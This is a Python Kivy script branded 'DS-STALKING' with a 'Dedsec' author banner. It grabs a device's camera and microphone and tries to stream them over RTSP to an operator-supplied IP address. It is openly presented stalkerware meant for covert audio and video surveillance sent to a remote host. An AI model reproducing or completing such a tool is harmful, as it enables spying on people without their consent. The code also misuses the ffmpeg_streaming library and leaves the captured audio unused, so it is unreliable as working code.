import cv2
import socket
import pyaudio
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from pyfiglet import Figlet
import ffmpeg_streaming
from ffmpeg_streaming import Formats


class CameraStreamer(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        # ASCII Banner
        custom_fig = Figlet(font='slant')
        print(custom_fig.renderText("DS-STALKING"))
        print("BY: 2806 | Telegram: t.me/Mr_2806 | Tiktok: dedsec_x.0 | Youtube: Dedsec assistant\n")

        # Configuration
        self.server_ip = input("Entrez l'adresse IP de votre terminal : ")
        self.rtsp_port = 8554
        self.camera_index = 0

        # Caméra configuration
        self.capture = cv2.VideoCapture(self.camera_index)
        self.capture.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        self.capture.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

        # Audio configuration
        self.p = pyaudio.PyAudio()
        self.audio_stream = self.p.open(format=pyaudio.paInt16,
                                        channels=1,
                                        rate=44100,
                                        input=True,
                                        frames_per_buffer=1024)

        # Lancement des threads
        threading.Thread(target=self.start_rtsp_stream).start()

    def start_rtsp_stream(self):
        """Capture vidéo/audio et démarre un flux RTSP."""
        print("Démarrage du flux RTSP sur rtsp://{}:{}".format(self.server_ip, self.rtsp_port))

        # Enregistrement RTSP avec FFmpeg
        input_video = ffmpeg_streaming.input(self.capture)
        input_audio = ffmpeg_streaming.input(self.audio_stream)

        # Serveur RTSP avec HLS
        ffmpeg_streaming.output(input_video, 'rtsp://{}:{}'.format(self.server_ip, self.rtsp_port), format=Formats.hls())


class DSStalkingApp(App):
    def build(self):
        return CameraStreamer()


if __name__ == '__main__':
    DSStalkingApp().run()